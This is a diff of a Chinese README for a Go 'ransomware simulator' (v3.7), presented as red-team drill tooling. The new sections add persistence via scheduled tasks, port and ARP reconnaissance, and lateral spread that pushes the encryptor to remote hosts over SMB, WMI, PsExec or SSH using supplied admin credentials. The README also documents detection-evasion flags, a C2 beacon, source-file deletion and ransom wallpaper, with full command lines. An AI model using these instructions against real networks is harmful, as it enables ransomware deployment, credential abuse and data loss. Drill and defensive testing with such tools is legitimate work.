@@ -1,6 +1,6 @@
 # 勒索软件模拟器 (Ransomware Simulator)
 
-[![Go](https://img.shields.io/badge/Go-1.24+-00ADD8?style=flat&logo=go)](https://golang.org) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT) ![Version](https://img.shields.io/badge/Version-v3.6-blue.svg)
+[![Go](https://img.shields.io/badge/Go-1.24+-00ADD8?style=flat&logo=go)](https://golang.org) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT) ![Version](https://img.shields.io/badge/Version-v3.7-blue.svg)
 
 > **⚠️ 安全警告**：本工具仅用于网络安全培训和防御研究。禁止用于非法用途。使用前请确保在隔离环境中运行！
 
@@ -22,8 +22,15 @@
 - **多语言勒索信**：中/英文双语勒索模板
 - **智能投放机制**：每个加密目录自动投放勒索信
 - **壁纸修改模拟**：加密完成后自动生成勒索提示壁纸并设为桌面壁纸（Windows / Linux / macOS，本地生成，无第三方依赖）
+- **提示文案随 `-remove` 变化**：默认（保留源文件）壁纸显示“本程序不会删除任何源文件”；使用 `-remove` 时壁纸额外显示“源文件已被删除”高亮提示，勒索信正文同步切换文案
+
+  不删除源文件（默认）：
 
   ![勒索提示壁纸预览](docs/preview_wallpaper.png)
+
+  删除源文件（`-remove`）：
+
+  ![删除源文件时的壁纸预览](docs/preview_wallpaper_deleted.png)
 
 ### 🛡️ 攻击链模拟
 - **服务停止攻击**：停止数据库、安全软件服务
@@ -33,6 +40,24 @@
 - **隐身模式** (`--stealth-mode`)：禁用看门狗、断开数据库连接、清除缓存
 - **行为控制** (`--no-stop-services`、`--no-kill-procs`、`--no-clear-logs`)：可跳过各阶段破坏性操作
 - **隐身延迟** (`--aggressive-delay`)：操作间随机延迟，规避行为检测
+
+### ⏰ 定时触发（v3.7）
+- **进程内定时**：`--delay`（等待时长）/ `--at`（绝对时刻），等待期间保持单实例锁并打印 ETA，支持 Ctrl+C 中断
+- **随机抖动**：`--random-delay` 在定时基础上叠加 `0~X` 随机延迟，打乱固定时序特征
+- **系统级计划任务**：`--persist-schedule` 注册任务后主进程退出，到点由系统唤起（Windows `schtasks`；Linux/macOS `systemd-run` → `at` → `crontab`），执行结束可用 `--schedule-cleanup` 自动清理
+
+### 🛰️ 攻击面侦察（模拟攻击扫描，v3.7）
+- **并发端口发现**：纯 TCP 连接探测（无漏洞利用、无口令爆破），内置企业常见服务端口与服务指纹映射
+- **本机资产发现**：网卡私有网段/网关推导、监听端口（`netstat -ano` / `ss -tlnp`）、`arp -a` 邻居表
+- **报告输出**：控制台表格 + `recon_report_<ts>.json` / `.csv`，结果可被 `--remote-auto` 直接消费
+- **仅侦察模式**：`--scan-only` 只做发现与报告，不加密、不触碰系统
+
+### 🌐 远程横向加密（v3.7）
+- **编排模型**：控制端投放「加密器自身 + 公钥」到远端暂存目录并远程执行，最后回收远端日志
+- **目标来源**：`--remote-hosts` / `--remote-hosts-file` / `--remote-auto`（消费侦察结果）
+- **多通道**：Windows 控制端 `wmi` → `schtasks` → `psexec`（自动选择，`smb` 为仅投递）；Linux/macOS 控制端 `ssh`（`scp` 投递）
+- **安全护栏**：默认只做连通性 + 投递演练且远端以 `-dry-run` 运行，必须显式 `--remote-confirm` 才会真实执行；`-remove` 不会自动透传
+- **报告输出**：逐主机状态表 + `remote_report_<ts>.json`，远端日志回收到控制端程序目录
 
 ### 🔗 C2 通信
 - **Beacon 心跳**：通过 Cloudflare Worker 发送加密状态心跳
@@ -52,9 +77,15 @@ ransom_simulator/
 │   ├── encryptor/                   # 加密器
 │   │   ├── windows/                 # Windows 特定代码
 │   │   │   ├── main.go             # Windows 加密器主程序
+│   │   │   ├── schedule.go         # 定时触发（进程内定时 + schtasks 计划任务）
+│   │   │   ├── recon.go            # 攻击面侦察（端口发现 + 本机资产 + 报告）
+│   │   │   ├── remote.go           # 远程横向加密编排（SMB/WMI/schtasks/PsExec）
 │   │   │   └── wallpaper.ps1       # 勒索壁纸生成脚本（//go:embed 内嵌）
 │   │   └── linux/                   # Linux/macOS 特定代码
 │   │       ├── main.go             # Linux/macOS 加密器主程序
+│   │       ├── schedule.go         # 定时触发（systemd-run / at / crontab）
+│   │       ├── recon.go            # 攻击面侦察（ss/netstat + 端口发现）
+│   │       ├── remote.go           # 远程横向加密编排（ssh/scp）
 │   │       └── wallpaper.go        # 勒索壁纸生成（标准库 + 点阵字体）
 │   └── decryptor/                   # 解密器
 │       └── main.go                 # 解密器主程序
@@ -63,14 +94,12 @@ ransom_simulator/
 │   │   ├── ransom_simulator.exe
 │   │   └── decryptor.exe
 │   ├── linux/                      # Linux 编译产物
-│   │   ├── encryptor
-│   │   ├── encryptor_static
-│   │   └── decryptor
-│   ├── macos/                      # macOS 编译产物
-│   │   ├── encryptor_amd64
-│   │   ├── encryptor_arm64
-│   │   ├── decryptor_amd64
-│   │   └── decryptor_arm64
+│   │   ├── ransom_simulator_linux
+│   │   ├── ransom_simulator_linux_static
+│   │   └── decryptor_linux
+│   ├── macos/                      # macOS 编译产物（通用二进制 amd64+arm64）
+│   │   ├── ransom_simulator_macos
+│   │   └── decryptor_macos
 │   └── decryptor/                  # 跨平台解密器
 │       └── decryptor.exe
 ├── scripts/                         # 构建脚本目录
@@ -114,11 +143,19 @@ chmod +x build_macos.sh
 
 ### 使用预编译版本
 
-编译后的程序位于 `build/` 目录，按平台分类：
+编译后的程序位于 `build/` 目录，发布文件命名如下：
+
+| 文件 | 平台 | 说明 |
+| --- | --- | --- |
+| `ransom_simulator.exe` | Windows | x86_64 加密端 |
+| `decryptor.exe` | Windows | x86_64 解密端 |
+| `ransom_simulator_linux` | Linux | x86_64 动态链接加密端 |
+| `ransom_simulator_linux_static` | Linux | x86_64 静态链接加密端 |
+| `ransom_simulator_macos` | macOS | 通用二进制（amd64 + arm64） |
 
 - **Windows**: `build/windows/*.exe`
 - **Linux**: `build/linux/*`
-- **macOS**: `build/macos/*`
+- **macOS**: `build/macos/*`（另含 `decryptor_macos` 通用二进制）
 
 ### 基本使用
 
@@ -147,13 +184,40 @@ ransom_simulator.exe -log -workers=4
 | -ext               | string | 指定要加密的文件扩展名            | ✅       | ✅     | ✅     | 预定义扩展名 | 如：.txt,.pdf,.docx                  |
 | -workers           | int    | 并发Worker线程数量                | ✅       | ✅     | ✅     | CPU核心数    | 建议根据系统资源调整                 |
 | -dry-run           | bool   | 演习模式，不实际加密              | ✅       | ✅     | ✅     | false        | 用于测试和演示                       |
-| -remove            | bool   | 加密后删除原文件                  | ✅       | ✅     | ✅     | false        | 高危操作，谨慎使用                   |
+| -remove            | bool   | 加密后删除原文件                  | ✅       | ✅     | ✅     | false        | 高危操作，谨慎使用；壁纸与勒索信会同步显示“已删除源文件”提示 |
 | -log               | bool   | 启用日志功能                      | ✅       | ✅     | ✅     | false        | 日志文件输出到程序所在目录           |
 | --stealth-mode     | bool   | 隐秘模式，完全跳过阶段2破坏性操作 | ✅       | ✅     | ✅     | false        | 仅执行文件加密，不触碰系统进程       |
 | --no-stop-services | bool   | 跳过停止数据库和安全服务          | ✅       | ✅     | ✅     | false        | 降低安全软件告警风险                 |
 | --no-kill-procs    | bool   | 跳过终止进程操作                  | ✅       | ✅     | ✅     | false        | 避免 process kill 行为特征           |
 | --no-clear-logs    | bool   | 跳过清除日志操作                  | ✅       | ✅     | ✅     | false        | 避免日志清除行为触发告警             |
 | --aggressive-delay | int    | 各操作间随机延迟上限（毫秒）      | ✅       | ✅     | ✅     | 0            | 打乱行为时序，降低检测特征，0=不延迟 |
+| --delay            | duration | 启动前等待时长（如 `30s`/`5m`/`2h`） | ✅       | ✅     | ✅     | 0            | 进程内定时，等待期间打印 ETA，可 Ctrl+C 中断 |
+| --at               | string | 定时启动时刻                      | ✅       | ✅     | ✅     | 空           | `2006-01-02 15:04:05`、`15:04`（已过则次日）、RFC3339 |
+| --random-delay     | duration | 在定时基础上叠加 0~X 随机抖动     | ✅       | ✅     | ✅     | 0            | 规避固定时序特征                     |
+| --persist-schedule | bool   | 注册系统级定时任务                | ✅       | ✅     | ✅     | false        | Win：`schtasks`；Linux/macOS：`systemd-run`→`at`→`crontab` |
+| --schedule-task-name | string | 定时任务名称                     | ✅       | ✅     | ✅     | RansomSimTask | 同名任务会被覆盖重建                |
+| --schedule-cleanup | bool   | 任务执行结束后自动清理任务        | ✅       | ✅     | ✅     | true         | 避免残留持久化痕迹                   |
+| --scan             | bool   | 启用攻击面侦察                    | ✅       | ✅     | ✅     | false        | 并发 TCP 端口发现 + 本机资产发现      |
+| --scan-only        | bool   | 仅侦察并输出报告，不加密          | ✅       | ✅     | ✅     | false        | 只读演练，不触碰文件与系统           |
+| --scan-targets     | string | 侦察目标（IP/CIDR/主机名，逗号分隔）| ✅       | ✅     | ✅     | 空           | `auto`=自动使用本机私有网段 + ARP 邻居 |
+| --scan-targets-file | string | 侦察目标清单文件                 | ✅       | ✅     | ✅     | 空           | 每行一个目标，`#` 为注释              |
+| --scan-ports       | string | 侦察端口列表（逗号分隔）          | ✅       | ✅     | ✅     | 内置常见端口  | 默认含 445/22/3389/3306/1433/6379 等  |
+| --scan-workers     | int    | 侦察并发数                        | ✅       | ✅     | ✅     | 128          | 单机探测为串行，并发作用于主机维度    |
+| --scan-timeout     | duration | 单端口探测超时                  | ✅       | ✅     | ✅     | 800ms        | 内网建议 300ms~1s                    |
+| --scan-icmp        | bool   | 先用 ping 探活                    | ✅       | ✅     | ✅     | false        | 仅用于标记存活，端口探测始终执行      |
+| --remote-hosts     | string | 远程目标（逗号分隔）              | ✅       | ✅     | ✅     | 空           | 支持 `user@host`、`host:port`        |
+| --remote-hosts-file | string | 远程目标清单文件                 | ✅       | ✅     | ✅     | 空           | 每行一个目标，`#` 为注释              |
+| --remote-auto      | bool   | 用侦察结果作为远程目标            | ✅       | ✅     | ✅     | false        | 需同时启用 `--scan`，取开放 445/22/5985/5986 的主机 |
+| --remote-user      | string | 远程认证用户名                    | ✅       | ✅     | ✅     | 空           | 留空则使用当前会话凭据               |
+| --remote-pass      | string | 远程认证口令                      | ✅       | ✅     | ✅     | 空           | Linux 端口令认证依赖 `sshpass`；Win 端明文出现在命令行 |
+| --remote-domain    | string | 远程认证域                        | ✅       | —      | —      | 空           | 仅 Windows 控制端使用                |
+| --remote-key       | string | SSH 私钥路径                      | —        | ✅     | ✅     | 空           | Linux/macOS 控制端推荐认证方式        |
+| --remote-port      | int    | 远程目标端口                      | ✅       | ✅     | ✅     | 445 / 22     | 未指定时按通道推断（Win 445，SSH 22）|
+| --remote-method    | string | 远程通道                          | ✅       | ✅     | ✅     | auto         | Win：`auto`/`smb`/`wmi`/`schtasks`/`psexec`；Unix：`auto`/`ssh`/`deploy-only` |
+| --remote-staging   | string | 远端暂存目录                      | ✅       | ✅     | ✅     | `C:\ProgramData\RsSim` / `/tmp/.rs_sim` | Win 需为 `C:\path` 形式（自动映射为 `C$` 管理共享）|
+| --remote-args      | string | 透传给远端 encryptor 的额外参数    | ✅       | ✅     | ✅     | 空           | 例如 `-workers 8 -ext .docx`（可用 `-dir` 覆盖沙箱目标）|
+| --remote-confirm   | bool   | 确认真实执行远端加密              | ✅       | ✅     | ✅     | false        | 缺省仅连通性+投递演练，远端以 `-dry-run` 运行 |
+| --remote-cleanup   | bool   | 执行后清理远端暂存目录            | ✅       | ✅     | ✅     | false        | 默认保留便于取证复核                 |
 
   > **注意**：壁纸篡改、桌面勒索信投放以及阶段 2 的破坏性操作仅在**非演习模式**（不加 `-dry-run`）时执行；`-dry-run` 演习模式不会修改文件或系统设置。
 
@@ -187,7 +251,8 @@ POST https://encrypt.yangzifun.org/E56dSY
 
 ### 2. 本地密钥模式（回退/离线）
 
-  当 API 不可用时（网络断开、服务不可达），自动回退到本地公钥文件：
+  当 API 不可用时（网络断开、服务不可达、返回内容异常），程序**直接回退到本地公钥**，
+  不会再因为联网失败而退出：
 
   **文件要求：**
 
@@ -207,10 +272,26 @@ MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwL6+M4l4R/6mZRZz9cLr
 -----END PUBLIC KEY-----
 ```
 
-  **UUID 自动提取：**
+  **查找顺序与命名兼容：**
 
-  - 程序自动从公钥文件名中提取 UUID
-  - UUID 格式：`xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`
+  - 优先程序目录，其次当前工作目录，最后用户级缓存目录
+  - 严格命名 `public_key_<uuid>.pem` > `public_key*.pem`（如 `public_key.pem`）> 任意 `*.pem`
+  - 损坏/非 RSA 的 PEM 会被自动跳过，继续尝试下一个候选文件
+  - 文件名不含 UUID 时，程序按公钥指纹（SHA-256）生成稳定 UUID，同一把公钥每次运行得到同一 ID
+
+  **公钥自动缓存：**
+
+  - 联网成功后，下发的公钥会保存到程序目录 `public_key_<uuid>.pem`；
+    程序目录不可写时额外缓存到用户配置目录：
+    - Windows：`%AppData%\RansomSimulator\keys\`
+    - Linux/macOS：`~/.config/RansomSimulator/keys/`
+  - 之后断网运行会直接使用该缓存密钥
+
+  **完全找不到密钥时：**
+
+  - 控制台打印可操作提示（公钥放置路径与命名规则），并**停留 15 秒后退出**，
+    避免双击运行时窗口一闪而过
+  - `-dry-run` 演习模式只提示、不中止，仍可查看将被加密的文件清单
 
 ### 3. Beacon 心跳
 
@@ -307,14 +388,64 @@ ransom_simulator.exe -log --no-clear-logs --no-kill-procs --aggressive-delay=300
 # 效果：跳过日志清除和进程终止，操作间随机延迟 0-3 秒，避免触发时序检测
 ```
 
+### 场景11：定时触发演练（v3.7）
+
+```bash
+# 延迟 30 分钟启动，并在定时基础上叠加 0~5 分钟随机抖动
+./ransom_simulator_linux -log -dir="/tmp/test_data" --delay 30m --random-delay 5m
+
+# 指定绝对时刻启动（当天该时刻已过则顺延到次日）
+./ransom_simulator_linux -log -dir="/tmp/test_data" --at "2026-10-21 02:30:00"
+
+# 注册系统级定时任务后主进程退出，到点由系统唤起（Windows 使用 schtasks）
+ransom_simulator.exe -log -dir="D:\test" --at "02:30" --persist-schedule
+```
+
+> 说明：计划任务仅保留可执行参数（自动剔除定时参数并追加调度标记）；`-dry-run` 等其余参数会一并透传。
+
+### 场景12：攻击面侦察演练（v3.7）
+
+```bash
+# 仅侦察：自动发现本机私有网段与 ARP 邻居，输出 JSON/CSV 报告，不加密任何文件
+./ransom_simulator_linux -log --scan-only --scan-targets auto --scan-ports "445,22,3389,3306"
+
+# 指定网段与单一目标，缩短超时并提高并发
+./ransom_simulator_linux -log --scan-only --scan-targets "10.0.0.0/24,10.0.1.5" \
+  --scan-workers 256 --scan-timeout 500ms
+```
+
+> 说明：侦察只有 TCP 连接探测与本机资产枚举，不含漏洞利用与口令爆破；单网段最多展开 1024 个地址，总目标上限 4096 个。
+
+### 场景13：远程横向加密编排（v3.7）
+
+```cmd
+:: Windows 控制端：先做演练（只连通 + 投递，远端以 -dry-run 运行）
+ransom_simulator.exe -log --remote-hosts "10.0.0.21,10.0.0.22" --remote-user Administrator --remote-pass "P@ssw0rd" --remote-method schtasks
+
+:: 用侦察结果自动挑选目标（开放 445/22/5985/5986 的主机）
+ransom_simulator.exe -log --scan --scan-targets auto --remote-auto --remote-method auto
+
+:: 显式确认真实执行，并透传远端加密参数（含 -remove 需要显式写出）
+ransom_simulator.exe -log --remote-hosts-file targets.txt --remote-user Administrator --remote-pass "P@ssw0rd" --remote-confirm --remote-args "-workers 8 -remove" --remote-cleanup
+```
+
+```bash
+# Linux/macOS 控制端：使用私钥认证（推荐）
+./ransom_simulator_linux -log --remote-hosts "ops@10.0.0.31,root@10.0.0.32" \
+  --remote-key ~/.ssh/id_rsa --remote-method ssh --remote-cleanup
+```
+
+> 说明：默认（未加 `--remote-confirm`）只做连通性 + 投递演练，远端以 `-dry-run` 运行；远端目标目录默认为暂存目录下的沙箱 `target`，避免误伤真实数据。
+
 ## 🔧 技术细节
 
 ### 密钥获取策略
 
 1. **API 优先**：启动时通过 HTTPS 请求远程获取 RSA 公钥
-2. **自动回退**：API 失败（超时/网络不可达）时自动加载本地公钥文件
-3. **UUID 管理**：API 模式由服务端生成 UUID，本地模式从文件名自动提取
+2. **自动回退**：API 失败（超时/网络不可达/返回内容异常）时直接加载本地公钥，不中止任务
+3. **UUID 管理**：API 模式由服务端生成 UUID；本地模式从文件名提取，文件名不含 UUID 时按公钥指纹生成
 4. **完全离线**：本地密钥模式无需网络连接，可在隔离环境中使用
+5. **可观测**：控制台输出当前使用的密钥来源；找不到密钥时给出可操作提示并停留窗口
 
 ### 攻击技术
 
@@ -386,12 +517,18 @@ ransom_simulator.exe -log --no-clear-logs --no-kill-procs --aggressive-delay=300
 
   **通用说明**
 
-  - **版式**：参照真实勒索壁纸版式（红底白字高亮大标题 + 居中说明 + 底部免责高亮条），使用项目自身品牌 `RANSOM SIM 3.6`
+  - **版式**：参照真实勒索壁纸版式（红底白字高亮大标题 + 居中说明 + 底部免责高亮条），使用项目自身品牌 `RANSOM SIM <版本号>`（版本号取自程序内 `version` 常量，无需手工同步）
+  - **文案随 `-remove` 变化**：默认（保留源文件）显示“本程序不会删除任何源文件 / THIS PROGRAM DOES NOT DELETE ANY SOURCE FILE”；使用 `-remove` 时，Windows 额外绘制红底白字提示条 `原始文件已被删除 / SOURCE FILES DELETED`，Linux/macOS 绘制 `SOURCE FILES HAVE BEEN DELETED !`，底部说明同步改为“已删除源文件、仅保留加密文件”（Linux/macOS 受内置点阵字体限制为英文大写）
   - **触发时机**：阶段 4（加密完成后）；**`-dry-run` 演习模式不执行**
   - **避免自加密**：生成物 `ransom_wallpaper.png` 已加入扫描排除名单，防止后续运行被自身加密
   - **如何还原**：Windows 在「设置 → 个性化 → 背景」重新选图，或执行 `reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "<原壁纸路径>" /f`；Linux/macOS 直接在桌面设置中重新选择背景图片
+  - **v3.7 便于还原**：篡改前会把原始壁纸路径打印到控制台并写入 `operations.log`（`原始桌面壁纸: <路径>`），可直接据此恢复
 
   ![勒索提示壁纸预览](docs/preview_wallpaper.png)
+
+  使用 `-remove`（删除源文件）时的壁纸预览：
+
+  ![删除源文件时的壁纸预览](docs/preview_wallpaper_deleted.png)
 
 ### 低特征模式（Linux）
 
@@ -415,6 +552,65 @@ ransom_simulator.exe -log --no-clear-logs --no-kill-procs --aggressive-delay=300
 | 隐藏服务操作      | `--no-stop-services`              | 🟡 中等风险 |
 | 时序混淆          | `--aggressive-delay=3000`         | 🟢 增强隐蔽 |
 | 完整阶段2（默认） | 无额外参数                        | 🔴 高风险   |
+
+### 定时触发（v3.7）
+
+  程序支持两种粒度的定时能力，二者可组合使用：
+
+| 模式        | 参数                                   | 行为                                                                 |
+| ----------- | -------------------------------------- | -------------------------------------------------------------------- |
+| 进程内定时  | `--delay` / `--at` / `--random-delay`  | 进程常驻等待，保持单实例锁，逐秒打印 ETA，Ctrl+C / SIGTERM 可中断     |
+| 系统级任务  | `--persist-schedule`                   | 注册任务后主进程立即退出，到点由操作系统唤起（可跨重启、跨登录会话） |
+
+  **平台实现：**
+
+| 平台        | 注册方式                                                            | 触发后清理                     |
+| ----------- | ------------------------------------------------------------------- | ------------------------------ |
+| Windows     | `schtasks /create /sc once /st HH:MM`（优先 `/rl HIGHEST`，非管理员环境自动退化为普通用户任务） | 进程结束时 `schtasks /delete`（`--schedule-cleanup=true`） |
+| Linux       | `systemd-run --on-calendar=<时间> --unit=<任务名>`（先系统级，失败再 `--user`），无 systemd 时回退 `at`，再回退 `crontab` | systemd 瞬时 timer 触发后自动回收；crontab 由包装脚本自删 |
+| macOS       | `at`（需启用 `atrun`），否则 `crontab`                              | 同上（crontab 包装脚本自删）    |
+
+  **参数透传规则**：注册任务时会自动剔除 `--delay/--at/--random-delay/--persist-schedule/--schedule-cleanup/--schedule-task-name`，并追加内部标记 `--scheduled-run`，确保被唤起的进程不再次进入等待、并在结束时按 `--schedule-cleanup` 清理任务。
+
+  > 注意：Windows `schtasks /sc once` 只能指定「时刻」而不能指定日期，因此目标时间超过 24 小时时会直接报错并回退为进程内等待；跨天场景请使用 `--delay` 或系统级任务管理器自行编排。
+
+### 攻击面侦察（模拟攻击扫描，v3.7）
+
+  **能力范围（只做发现，不做利用）：**
+
+| 能力             | 实现                                                                 | 说明                                     |
+| ---------------- | -------------------------------------------------------------------- | ---------------------------------------- |
+| 网段自动推导     | `net.Interfaces` 过滤私有 IPv4（`IsPrivate`/链路本地）                | 默认不扫描公网地址                       |
+| 目标解析         | IP / CIDR / 主机名 / 清单文件，`auto` = 本机网段 + ARP 邻居           | 单网段最多 1024 个地址，总目标上限 4096   |
+| 并发端口探测     | 纯 Go `net.DialTimeout`，worker 池并发（`--scan-workers`）            | 只建立 TCP 连接并抓取横幅，无漏洞利用     |
+| 服务与风险指纹   | 内置 24 个企业高价值端口 → 服务名/风险等级映射                        | SMB/RDP/MSSQL/Redis/MongoDB 等标记为高危  |
+| 横幅抓取         | 200ms 超时读取，HTTP 端口发送 `HEAD /` 请求                           | 自动过滤不可打印字符                     |
+| 本机资产发现     | `netstat -ano`（Win）/ `ss -tlnp`→`netstat`（Linux/macOS）、`arp -a`   | 输出监听端口与同网段邻居                 |
+| 报告输出         | `recon_report_<ts>.json` / `.csv` + 控制台表格                        | 结果可被 `--remote-auto` 直接消费         |
+
+  **风险等级定义**：命中任一「高危」端口 → 高危；仅命中「中危」→ 中危；否则低危。
+
+  `--scan-only` 会在侦察后直接结束（不进入加密与阶段 2 破坏性操作），适合资产盘点与防御侧验证。
+
+### 远程横向加密编排（v3.7）
+
+  **编排流程**：`端口可达性 → 凭据认证 → 投递（加密器自身 + 公钥 + 说明文件）→ 远程执行 → 回收远端日志 → 汇总报告`
+
+| 平台（控制端） | 认证                                    | 投递             | 执行                                        | 仅投递模式       |
+| -------------- | --------------------------------------- | ---------------- | ------------------------------------------- | ---------------- |
+| Windows        | `net use \\host\IPC$ /user:...`         | 管理共享 `C$`    | `wmic process call create` → `schtasks /s` → `psexec` | `--remote-method smb` |
+| Linux / macOS  | `ssh`（私钥；口令需 `sshpass`）          | `scp`            | `ssh ... setsid nohup ./run.sh`             | `--remote-method deploy-only` |
+
+  **载荷与沙箱**：远端暂存目录默认 Windows `C:\ProgramData\RsSim`、Unix `/tmp/.rs_sim`；其中 `target/` 为默认加密目标沙箱，并通过 `run.bat` / `run.sh` 拉起载荷，避免多层引号转义问题。真实执行前可先用 `--remote-args "-dir <真实目录>"` 覆盖目标（Go flag 后者覆盖前者）。
+
+  **安全护栏（重要）**：
+
+  - 未显式指定 `--remote-confirm` 时，`remoteMode = dry-run`：远端只以 `-dry-run` 运行，**不会加密任何远端数据**；
+  - 全局 `-dry-run` 会使所有远程动作自动降级为演习；
+  - `-remove` 不会自动透传到远端，必须在 `--remote-args` 中显式写出；
+  - 远端密码/口令会出现在本机命令行（`net use`、`wmic /password:`、`sshpass -p`），请仅在隔离演练环境使用；
+  - 远程目标的真实执行依赖目标侧权限（Windows 远程创建进程通常需要管理员凭据；Windows 11 起 `wmic` 默认不再内置，会自动回退到 `schtasks`）；
+  - `--remote-report` 汇总与远端日志（回收到 `remote_<host>_*.log`）用于事后取证与效果核对。
 
 ### Windows 平台特有功能
 
@@ -457,7 +653,7 @@ ransom_simulator.exe -log --no-clear-logs --no-kill-procs --aggressive-delay=300
 
 ```
   =================== 勒索软件模拟器日志 ===================
-  程序版本: v3.6
+  程序版本: v3.7
   开始时间: 2026-07-31 14:30:25
   运行参数: ./ransom_simulator_linux -log -workers 4
   工作目录: /home/user/tools
@@ -510,9 +706,9 @@ ransom_simulator.exe -log --no-clear-logs --no-kill-procs --aggressive-delay=300
 | **Tactic (战术)** | **ID** | **新增模拟行为**                                             |
 | ----------------- | ------ | ------------------------------------------------------------ |
 | **防御规避**      | TA0005 | **服务停止攻击**：停止数据库和安全服务<br>**内存清理**：清理数据库缓存和系统内存<br>**进程守护解除**：停止守护进程和定时任务<br>**v3.4 低特征对抗**：SIGTERM 替代 SIGKILL、移除 systemctl disable、随机延迟打乱时序 |
-| **持久化**        | TA0003 | **增强互斥锁**：强制释放旧锁文件，自动重置状态               |
-| **发现**          | TA0007 | **增强文件识别**：支持数据库文件、配置文件、备份文件<br>**数据库发现**：自动扫描数据库数据目录 |
-| **横向移动**      | TA0008 | **数据库攻击**：终止数据库连接，解挂网络链接                 |
+| **持久化**        | TA0003 | **增强互斥锁**：强制释放旧锁文件，自动重置状态<br>**v3.7 定时持久化**：`--persist-schedule` 注册 schtasks / systemd-run / at / crontab 定时任务 |
+| **发现**          | TA0007 | **增强文件识别**：支持数据库文件、配置文件、备份文件<br>**数据库发现**：自动扫描数据库数据目录<br>**v3.7 网络与主机发现**：并发端口探测、服务指纹、本机监听端口与 ARP 邻居枚举 |
+| **横向移动**      | TA0008 | **数据库攻击**：终止数据库连接，解挂网络链接<br>**v3.7 远程横向加密**：SMB/WMI/schtasks/PsExec/SSH 通道投递载荷到远端并执行、回收日志 |
 | **影响**          | TA0040 | **增强加密目标**：针对企业关键资产的专项攻击<br>**详细日志记录**：完整攻击过程审计追踪 |
 
 ## 🔐 解密流程
@@ -707,7 +903,8 @@ curl "https://encrypt.yangzifun.org/stats?range=1m"
   - **网络连接：** 加密过程需要访问 Cloudflare Worker API，请确保网络稳定。
   - **API 限制：** 脚本、程序及 API 服务会不定时更新，如遇执行错误，请从密钥查询页面更新程序。
   - **数据保存：** 本系统会定期清理 `keys` 表，如需保留密钥请尽快下载私钥文件。统计总数（总生成次数、最新记录等）独立存储在 `key_metrics` 表中，清理 `keys` 表不影响累计统计数据。
-  - **重要声明：** **该站点提供的脚本仅用于演练防加密勒索，其他用途及使用过程中数据丢失与本服务无关！** 加密过程中源文件不会被自动清除。
+  - **重要声明：** **该站点提供的脚本仅用于演练防加密勒索，其他用途及使用过程中数据丢失与本服务无关！** 加密过程中源文件默认不会被自动清除；仅当显式使用 `-remove` 时才会删除源文件（此时壁纸与勒索信会同步显示“已删除源文件”提示）。
+- **v3.7 远程编排声明：** 攻击面侦察（`--scan`）与远程横向加密（`--remote-*`）**仅可在你拥有合法授权的隔离环境内使用**。远程编排默认处于演练护栏（只做连通性与投递，远端以 `-dry-run` 运行），必须显式 `--remote-confirm` 才会真实执行；对未授权主机进行扫描或投递均可能构成违法行为，请自行承担全部责任。
   - **系统影响：** 非演习模式下会**修改当前用户的桌面壁纸**（生成 `ransom_wallpaper.png` 并设为背景）并向桌面写入勒索信，请在演练前备份壁纸设置，演练后自行还原。
 
 ## ⚠️ 免责声明
